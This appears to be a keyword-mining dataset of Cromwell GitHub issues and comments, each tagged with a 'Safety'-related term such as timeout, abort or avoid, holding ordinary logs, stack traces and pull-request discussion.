Safety,"Timeout = 5 seconds; [2019-02-11 10:13:36,34] [info] Aborting all running workflows.; [2019-02-11 10:13:36,34] [info] WorkflowStoreActor stopped; [2019-02-11 10:13:36,34] [info] Shutting down JobExecutionTokenDispenser - Timeout = 5 seconds; [2019-02-11 10:13:36,34] [info] JobExecutionTokenDispenser stopped; [2019-02-11 10:13:36,34] [info] WorkflowLogCopyRouter stopped; [2019-02-11 10:13:36,35] [info] Shutting down WorkflowManagerActor - Timeout = 3600 seconds; [2019-02-11 10:13:36,35] [info] WorkflowManagerActor All workflows finished; [2019-02-11 10:13:36,35] [info] WorkflowManagerActor stopped; [2019-02-11 10:13:36,78] [info] Connection pools shut down; [2019-02-11 10:13:36,78] [info] Shutting down SubWorkflowStoreActor - Timeout = 1800 seconds; [2019-02-11 10:13:36,78] [info] Shutting down JobStoreActor - Timeout = 1800 seconds; [2019-02-11 10:13:36,78] [info] SubWorkflowStoreActor stopped; [2019-02-11 10:13:36,78] [info] JobStoreActor stopped; [2019-02-11 10:13:36,78] [info] Shutting down CallCacheWriteActor - Timeout = 1800 seconds; [2019-02-11 10:13:36,78] [info] Shutting down ServiceRegistryActor - Timeout = 1800 seconds; [2019-02-11 10:13:36,78] [info] Shutting down DockerHashActor - Timeout = 1800 seconds; [2019-02-11 10:13:36,78] [info] Shutting down IoProxy - Timeout = 1800 seconds; [2019-02-11 10:13:36,78] [info] CallCacheWriteActor Shutting down: 0 queued messages to process; [2019-02-11 10:13:36,78] [info] CallCacheWriteActor stopped; [2019-02-11 10:13:36,78] [info] IoProxy stopped; [2019-02-11 10:13:36,79] [info] WriteMetadataActor Shutting down: 0 queued messages to process; [2019-02-11 10:13:36,79] [info] DockerHashActor stopped; [2019-02-11 10:13:36,79] [info] KvWriteActor Shutting down: 0 queued messages to process; [2019-02-11 10:13:36,80] [info] ServiceRegistryActor stopped; [2019-02-11 10:13:36,80] [info] Shutting down connection pool: curAllocated=0 idleQueues.size=0 waitQueue.size=0 maxWaitQueueLimit=256 closed=false; [2019-02-11 10:13:36,80]",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4626:15599,Timeout,Timeout,15599,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4626,8,['Timeout'],['Timeout']
Safety,Timeout persisting runtime attributes causes workflow failure.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/737:0,Timeout,Timeout,0,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/737,1,['Timeout'],['Timeout']
Safety,Timeout when running dockerScripts,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4933:0,Timeout,Timeout,0,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4933,1,['Timeout'],['Timeout']
Safety,"To avoid lossy conversion during Centaur tests metadata assertions for a shard that has multiple attempts, this PR adds attempt number in the flattened metadata structure:. ```; <workflow_name>.<task_name>.<shard_index>.<attempt_number>.<metadata_key>; ```. Closes https://broadworkbench.atlassian.net/browse/BW-482",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6158:3,avoid,avoid,3,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6158,1,['avoid'],['avoid']
Safety,"To be clear I'm not 💩 💩 ing the multiple ServiceRegistryActor idea, just pointing out one potential gotcha I can see. I have reservations about my hacky ""crank up the timeout"" ""solution"" in the #1057 PR and would definitely like to look at other options like this.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1060#issuecomment-228143719:167,timeout,timeout,167,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1060#issuecomment-228143719,2,['timeout'],['timeout']
Safety,"To be clear, fail-fast should not attempt to abort currently running calls even if those calls might otherwise continue to run for a long time?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/587#issuecomment-198424257:45,abort,abort,45,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/587#issuecomment-198424257,2,['abort'],['abort']
Safety,"To get more specific on this one (as Jose has informed me that the issue of Cromwell status updating is really a collection of different things) what it looks like here is we had a recent slew of connection timeouts when Cromwell tried to talk to the DB, on Saturday morning it appears. Perhaps we need to up the wait time from 5000ms?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/800#issuecomment-217917736:207,timeout,timeouts,207,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/800#issuecomment-217917736,1,['timeout'],['timeouts']
Safety,"To make cromwell a bit more self-sufficient as a ""server"", having access to `wdltool inputs` as an API endpoint would avoid needing to orchestrate a client having access to wdltool for that functionality.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2651:118,avoid,avoid,118,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2651,1,['avoid'],['avoid']
Safety,"To make cromwell a bit more self-sufficient as a ""server"", having access to `wdltool validate` as an API endpoint would avoid needing to orchestrate a client having access to wdltool for that functionality. . This issue is a companion to #2651.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2652:120,avoid,avoid,120,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2652,1,['avoid'],['avoid']
Safety,"To stick to our launch schedule for the GATK-aaS alpha, I'd really like to see this functionality (enable Cromwell server to treat SIGINT as abort) go in this week. . Is that going to be feasible? Who should David sync with to figure out how best to do it?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/397#issuecomment-175717937:141,abort,abort,141,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/397#issuecomment-175717937,1,['abort'],['abort']
Safety,"ToL about a few ways to assert deeper on this -- for JES, you could label; the VM with a random number (so you can find it later), then assert you can; find it out of band using gcloud commands, do the abort, then assert it; goes away. Similar for the local backend using a command with some unique; value that you can grep a ps for. -------------------------------; Kristian Cibulskis; Engineering Director, Data Sciences & Data Engineering; Broad Institute of MIT and Harvard; kcibul@broadinstitute.org. On Thu, Mar 23, 2017 at 3:37 PM, Jeff Gentry <notifications@github.com>; wrote:. > a big issue w/ abort is not that it doesn't claim it aborted in the; > response but all hell breaks loose internally :); >; > —; > You are receiving this because you are subscribed to this thread.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/2088#issuecomment-288836659>,; > or mute the thread; > <https://github.com/notifications/unsubscribe-auth/ABW4gzQqYfBKEOyRH6s2_KiWyfqyG647ks5rosn9gaJpZM4MnQcP>; > .; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2088#issuecomment-288910885:202,abort,abort,202,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2088#issuecomment-288910885,3,['abort'],"['abort', 'aborted']"
Safety,"ToL: (sorry for the seagulling...) I did find the names and semantics of these new filters a tiny bit confusing and it started me wondering whether these combinations of various label filters are likely to get harder to manage as more filter types get dreamed up. At the risk of ""if you have a hammer every problem starts to look like a nail"", I wonder whether a basic expression style syntax will be a good idea at some point, something like e.g.:. (""Label1"" && ""Label2"" && !""Label3"") || ""Label4"". If that ever does sound worth pursuing, there's a cool looking (previously core Scala) library which might be able to help: https://github.com/scala/scala-parser-combinators",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3800#issuecomment-398948843:271,risk,risk,271,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3800#issuecomment-398948843,1,['risk'],['risk']
Safety,"ToL:. Looking at this, I wonder whether an easier route to the upgrade script is to make another implementation of this `WdlWriter` typeclass for draft 2 `WdlNamespace`. It leaves us further away from funneling draft 2 and draft 3 through the same object mode (and the massive code deletion we'd get from that)l, but it might be a much more expedient (and maybe safer?) way of achieving the upgrade script?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3601#issuecomment-387452833:362,safe,safer,362,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3601#issuecomment-387452833,1,['safe'],['safer']
Safety,"Transient ""failure"" in metadata during Abort",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4484:39,Abort,Abort,39,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4484,1,['Abort'],['Abort']
Safety,"Tried to re-run the 10K JG workflow with CC on, the workflow failed almost immediately with multiple errors like; ```; [ERROR] [04/18/2017 21:11:44.685] [cromwell-system-akka.dispatchers.service-dispatcher-86] [akka://cromwell-system/user/cromwell-service/ServiceRegistryActor/MetadataService/metadata-summary-actor] Failed to summarize metadata; java.util.concurrent.RejectedExecutionException: Task slick.basic.BasicBackend$DatabaseDef$$anon$2@64919660 rejected from slick.util.AsyncExecutor$$anon$2$$anon$1@1dce40e4[Running, pool size = 20, active threads = 20, queued tasks = 1000, completed tasks = 800]; 	at java.util.concurrent.ThreadPoolExecutor$AbortPolicy.rejectedExecution(ThreadPoolExecutor.java:2047); 	at java.util.concurrent.ThreadPoolExecutor.reject(ThreadPoolExecutor.java:823); 	at java.util.concurrent.ThreadPoolExecutor.execute(ThreadPoolExecutor.java:1369); 	at slick.util.AsyncExecutor$$anon$2$$anon$3.execute(AsyncExecutor.scala:120); 	at slick.basic.BasicBackend$DatabaseDef$class.runSynchronousDatabaseAction(BasicBackend.scala:233); 	at slick.jdbc.JdbcBackend$DatabaseDef.runSynchronousDatabaseAction(JdbcBackend.scala:38); 	at slick.basic.BasicBackend$DatabaseDef$class.runInContext(BasicBackend.scala:210); 	at slick.jdbc.JdbcBackend$DatabaseDef.runInContext(JdbcBackend.scala:38); 	at slick.basic.BasicBackend$DatabaseDef$class.run$1(BasicBackend.scala:153); 	at slick.basic.BasicBackend$DatabaseDef$class.runInContext(BasicBackend.scala:157); 	at slick.jdbc.JdbcBackend$DatabaseDef.runInContext(JdbcBackend.scala:38); 	at slick.basic.BasicBackend$DatabaseDef$class.runInContext(BasicBackend.scala:179); 	at slick.jdbc.JdbcBackend$DatabaseDef.runInContext(JdbcBackend.scala:38); 	at slick.basic.BasicBackend$DatabaseDef$class.runInternal(BasicBackend.scala:78); 	at slick.jdbc.JdbcBackend$DatabaseDef.runInternal(JdbcBackend.scala:38); 	at slick.basic.BasicBackend$DatabaseDef$class.run(BasicBackend.scala:75); 	at slick.jdbc.JdbcBackend$DatabaseDef.run(JdbcBackend.scala:",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2182:654,Abort,AbortPolicy,654,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2182,1,['Abort'],['AbortPolicy']
Safety,"Tried tracing through the latest `CromwellTestkitSpec`, but I'm not entirely sure which of the various `ask` are timing out. For now 👍 assuming Travis gets happy. I imagine the 10 second default timeouts are just on the cusp of the length of the `SingleToArrayCoercion` wdl runs, and may succeed just in time on a re-run. So maybe kick it a few times until one can go back (again) and figure out what we actually want for the various test durations and blocking within our future/actor/ask/retry soup?. [![Approved with PullApprove](https://img.shields.io/badge/pullapprove-approved-brightgreen.svg)](https://pullapprove.com/broadinstitute/cromwell/pull-request/1045/?utm_source=github-pr&utm_medium=comment-badge&utm_campaign=broadinstitute/cromwell)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1045#issuecomment-227654083:195,timeout,timeouts,195,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1045#issuecomment-227654083,1,['timeout'],['timeouts']
Safety,"Triggered by investigation of DSDEEPB-1934. This caused problems in the past but I was unable to recreate a situation where a backend would update an abort function mid-call. Even if our backends no longer update abort functions mid-call, there's no reason not to allow it for potential future backends.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/326:150,abort,abort,150,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/326,2,['abort'],['abort']
Safety,"Trivially happened again, same error... Output of `Ctl-\`:. ```; ""shutdownHook1"" #44 prio=5 os_prio=0 tid=0x00007fdbcc9ce000 nid=0x10a8 waiting on condition [0x00007fd9ccfce000]; java.lang.Thread.State: TIMED_WAITING (sleeping); at java.lang.Thread.sleep(Native Method); at cromwell.engine.workflow.WorkflowManagerActor$$anonfun$addShutdownHook$1.apply$mcV$sp(WorkflowManagerActor.scala:125); at scala.sys.ShutdownHookThread$$anon$1.run(ShutdownHookThread.scala:34). ""pool-1-thread-20"" #95 prio=5 os_prio=0 tid=0x00007fdaa80c0000 nid=0xa56 waiting on condition [0x00007fda90575000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x000000015b9a2568> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-19"" #94 prio=5 os_prio=0 tid=0x00007fdaa80be800 nid=0xa55 waiting on condition [0x00007fda90676000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x000000015b9a2568> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.ja",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-258913914:638,Unsafe,Unsafe,638,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-258913914,1,['Unsafe'],['Unsafe']
Safety,Try to reproduce hashing timeouts in a cromwell that's not being spammed on /stats,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3712:25,timeout,timeouts,25,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3712,1,['timeout'],['timeouts']
Safety,"Trying to read an object that has the same name as a variable causes Cromwell to abort not just the workflow, but the entire Cromwell instance; WDL file:; ```; task TestTask {; 	; 	command {; 		echo ""Hello World!"" > hello_world.txt; 	}. 	output {; 		File exists = ""hello_world.txt""; 	}. 	runtime {; 		docker: will_fail.docker; 		memory: will_fail.memory; 		disks: ""local-disk "" + will_fail.small_disk + "" HDD""; 	}; }. workflow KillsCromwell {; 	String test_string. # This here kills Cromwell; 	Object runtime_params = read_object(runtime_params). 	call TestTask ; }; ```. Inputs File:; ```; {; 	""KillsCromwell.test_string"": ""This is a string"",; 	""KillsCromwell.runtime_params"": {; 		""genomes_cloud_image"": ""broadinstitute/genomes-in-the-cloud:2.2.4-1469632282"",; 		""small_disk"": 100,; 		""medium_disk"": 200,; 		""large_disk"": 300,; 		""x_large_disk"": 400,; 		""preemptible_tries"": 3; 	}; }; ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1946:81,abort,abort,81,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1946,1,['abort'],['abort']
Safety,Trying to recover space to prevent us hitting the 10 TB limit.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4880:10,recover,recover,10,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4880,1,['recover'],['recover']
Safety,Tune staleness threshold for backpressure to avoid unwanted slowdowns [CROM-6850],MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6638:45,avoid,avoid,45,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6638,1,['avoid'],['avoid']
Safety,Tweaks to test timeouts.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4296:15,timeout,timeouts,15,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4296,1,['timeout'],['timeouts']
Safety,Unable to recover running jobs in AWS backend,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4857:10,recover,recover,10,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4857,1,['recover'],['recover']
Safety,Under test as: https://gotc-jenkins.dsp-techops.broadinstitute.org/job/cromwell-cron-papiv2-alpha1/773/console. EDIT: Timeout needed to be reset to 10h. Retrying as:; * PAPIv2-alpha: https://gotc-jenkins.dsp-techops.broadinstitute.org/job/cromwell-cron-papiv2-alpha1/774/console; * PAPIv2-beta: https://gotc-jenkins.dsp-techops.broadinstitute.org/job/cromwell-cron-papiv2-beta/165/console,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5924:118,Timeout,Timeout,118,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5924,1,['Timeout'],['Timeout']
Safety,"Unstick abort, develop edition.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2154:8,abort,abort,8,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2154,1,['abort'],['abort']
Safety,"Unstick abort, hotfix edition.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2153:8,abort,abort,8,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2153,1,['abort'],['abort']
Safety,"Until we work this out, we shouldn't risk accidentally CCing, or spamming awful error messages.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3125:37,risk,risk,37,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3125,1,['risk'],['risk']
Safety,"Unwired the `DockerHashLookupWorkerActor`.; Removed the unused docker registry client.; Cleaned up spray dependencies now that the spray-client is no longer used.; Refactored places that were sending spray classes down into the business logic.; Turned back on deprecation warnings.; Fixed scalaz flatMap deprecation warning by adding Y.A. implicit import.; Undeprecated `TerminalUtil` used by the single workflow runner's pretty printer.; Removed empty files from git.; Bumped timeout for `SharedFileSystemJobExecutionActorSpec.recoverSpec` up to 10 seconds dilated.; Increased sleep for `WorkflowExecutionActorSpec.""retry a job 2 times""` up to 3 seconds dilated.; Updated scalatest to 3.0.0.; Removed leftover bits of `DontUseMainSpecTest`.; Printing test times, minimal stack traces, and resummarizing tests failures, via http://www.scalatest.org/user_guide/running_your_tests.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1338:477,timeout,timeout,477,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1338,2,"['recover', 'timeout']","['recoverSpec', 'timeout']"
Safety,Up the CWL conformance test timeout BT-272,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6336:28,timeout,timeout,28,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6336,1,['timeout'],['timeout']
Safety,Update requester-pays error detection [BT-574],MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6689:28,detect,detection,28,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6689,1,['detect'],['detection']
Safety,"Update the Docker image regex to expect port numbers to have 4 or 5 digits. Interested in thoughts on this approach, because it's not bulletproof in either direction:; * 1-3 digit port numbers are technically possible, though I've never observed one associated with a Docker repo; * 4-5 digit numeric image tags are technically possible. If this doesn't feel like a safe solution, I can take a stab at a more aggressive update to this regex.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7367:366,safe,safe,366,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7367,1,['safe'],['safe']
Safety,"Update: To avoid having all Cromwell instances send same data points to Grafana, now the config is an `Option[A]`. This way we can set it for the summarizer instance (PR [#2592](https://github.com/broadinstitute/firecloud-develop/pull/2592)) and have only 1 instance send data points. Testing from Dev:. ![Screen Shot 2021-07-06 at 2 10 25 PM](https://user-images.githubusercontent.com/16748522/124667085-edb05780-de7c-11eb-8dbd-888b13d702f7.png)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6382#issuecomment-875084254:11,avoid,avoid,11,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6382#issuecomment-875084254,1,['avoid'],['avoid']
Safety,"Using `better.files` for metadata writing, and removed heaviest duplicated `FileUtil` similarity.; Refactored `Main` to avoid test issues with `DelayedInit`, `System.exit`, consistent error generation, etc.; Removed blocking code from `SingleWorkflowRunnerActor`, and passing `Shutdown` as message now, instead of killing system directly.; Reused / refactored some of the test methods for actors, and removed bitrotted `DefaultWorkflowManagerActor`.; Left comments (warnings?) about possible bugs / improvements to workflow `Actor` messaging.; Replaced use of Java `SystemProperties` with Scala `sys.props`.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/265:120,avoid,avoid,120,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/265,1,['avoid'],['avoid']
Safety,"Version 1.67 is vulnerable and versions 1.69+ are safe. Upgraded to latest version 1.70. `sbt assembly` succeeds. The line; ```; addDependencyTreePlugin; ```; enables a handy new command; ```; whatDependsOn org.bouncycastle bcprov-jdk15on 1.67; ```; shows what chain of artifacts uses a leaf-node dependency – an inversion of the traditional dependency tree:; ```; [info] org.bouncycastle:bcprov-jdk15on:1.67; [info] +-org.bouncycastle:bcpkix-jdk15on:1.67; [info] +-io.grpc:grpc-xds:1.46.0; [info] +-io.grpc:grpc-googleapis:1.46.0; [info] +-com.google.api:gax-grpc:2.18.1; [info] +-com.google.cloud:google-cloud-resourcemanager:1.4.0; [info] +-org.broadinstitute:cloud-nio-spi_2.13:80-d24645a-SNAP [S]; [info] +-org.broadinstitute:cloud-nio-util_2.13:80-d24645a-SNAP [S]; ```. With this PR's fix in place, the output is a gratifying ""this isn't used anywhere"" error:; ```; root(aen_bw_1227)> | 80> whatDependsOn org.bouncycastle bcprov-jdk15on 1.67; [error] Expected 'org.broadinstitute'; [error] Expected '1.70'; [error] whatDependsOn org.bouncycastle bcprov-jdk15on 1.67; [error] ^; ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6775:50,safe,safe,50,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6775,1,['safe'],['safe']
Safety,"WARNING: This PR is huge and needs to be reviewed carefully, we have already performed many manual tests + ported many other tests from PAPI. ## Intro. The main goal is to refactor Batch backend to include [PipelinesApiRequestManager](https://github.com/broadinstitute/cromwell/blob/5448b85bf334e0970665a69549e796199acc8bd7/supportedBackends/google/pipelines/common/src/main/scala/cromwell/backend/google/pipelines/common/api/PipelinesApiRequestManager.scala) and [PipelinesApiRequestWorker](https://github.com/broadinstitute/cromwell/blob/5448b85bf334e0970665a69549e796199acc8bd7/supportedBackends/google/pipelines/common/src/main/scala/cromwell/backend/google/pipelines/common/api/PipelinesApiRequestWorker.scala). This also fixes a few missing details from the initial Batch integration (#7177), for example:; 1. Missing metrics are now published.; 2. The job status is queried before deleting it to try preventing the deletion of jobs that are in a final state (PAPI can abort jobs but Batch deletes them instead). I have been trying to split this into multiple smaller PRs, please let me know if you can find any piece that can be submitted independently, previous PRs:. - #7413; - #7394 ; - #7411; - #7410 ; - #7393; - #7421; - #7428. <details>; <summary>Questions (already resolved)</summary>. ## Questions. 1. There is a centaur test included in the Batch suite, still, this seems to invoke a papi test [testCentaurGcpBatch.sh](https://github.com/broadinstitute/cromwell/blob/5448b85bf334e0970665a69549e796199acc8bd7/src/ci/bin/testCentaurGcpBatch.sh#L25) (see [papi_v2alpha1_gcsa.test](https://github.com/broadinstitute/cromwell/blob/5448b85bf334e0970665a69549e796199acc8bd7/centaur/src/main/resources/standardTestCases/papi_v2alpha1_gcsa.test#L3), the test itself says that batch backend is not used). Could this be related to the false-alarms from codecoverage's bot?; 2. There warnings raised by codecov which seem wrong, for example, the lines mentioned on [GcpBatchGroupedRequests](https",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7412:975,abort,abort,975,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7412,1,['abort'],['abort']
Safety,WM-2428: Include full error context when failing to abort TES jobs,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7354:52,abort,abort,52,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7354,1,['abort'],['abort']
Safety,WX-1110[risk=low] Added endpoint to fetch failed tasks by workflow id,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7165:8,risk,risk,8,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7165,1,['risk'],['risk']
Safety,WX-1339 Make `throwExceptionOnExecuteError` false for PAPI aborts,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7245:59,abort,aborts,59,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7245,1,['abort'],['aborts']
Safety,WX-1748 Increase read timeout for engine function evaluation,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7485:22,timeout,timeout,22,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7485,1,['timeout'],['timeout']
Safety,WX-757 Fix workflow stuck in aborting after WDL type error,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7385:29,abort,aborting,29,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7385,1,['abort'],['aborting']
Safety,"Was meaning to push this before heading out for the week: . A work-in-progress Job Store writer which skirts the problem of databases by not actually ever using one. Instead, every Job has a known filesystem location and we just write to and (not yet) read back from disk. Currently has all of the hooks and wiring needed to write jobs the JobStore and clear them out on workflow completion. All that should be left is to update the JobStoreReader to read back the JSON from an appropriate file (but the tests are there for the JSON implicits and they seems good). NB I went down the JSON route because I anticipate an eventual DB schema more like the metadata, to avoid having to store multiple MBs or GBs in a single cell.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1155:665,avoid,avoid,665,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1155,1,['avoid'],['avoid']
Safety,"We are seeing infrequent situations where JES says a call is done but cromwell thinks it is still running. I see the call starting in the logs:; ```; 2017-02-08 18:55:58,500 cromwell-system-akka.dispatchers.engine-dispatcher-963 INFO - WorkflowExecutionActor-fa7e25a2-f51f-4763-9f8a-5a2e5cd1c954 [UUID(fa7e25a2)]: Starting calls: pon_gatk_workflow.PadTargets:NA:1; ```. Then the only suspicious things I see later in the logs are these messages (which could be completely unrelated however they do start to appear 2.5 minutes after the job completes on JES):; ```; 2017-02-08 19:17:07,588 cromwell-system-akka.dispatchers.backend-dispatcher-424 INFO - The JES polling actor Actor[akka://cromwell-system/user/cromwell-service/$b/$a/$Enn#762671444] unexpectedly terminated while conducting 100 polls. Making a new one...; java.lang.NullPointerException: null; 2017-02-08 19:17:07,588 cromwell-system-akka.dispatchers.backend-dispatcher-246 ERROR - null; ```. For future reference by a FireCloud admin the operations id is ELSl1PihKxjdhp-6gvr3weYBILma7PWMHyoPcHJvZHVjdGlvblF1ZXVl and the workflow id is fa7e25a2-f51f-4763-9f8a-5a2e5cd1c954 and the workflow was aborted 3PM Feb 8.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1965:1158,abort,aborted,1158,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1965,1,['abort'],['aborted']
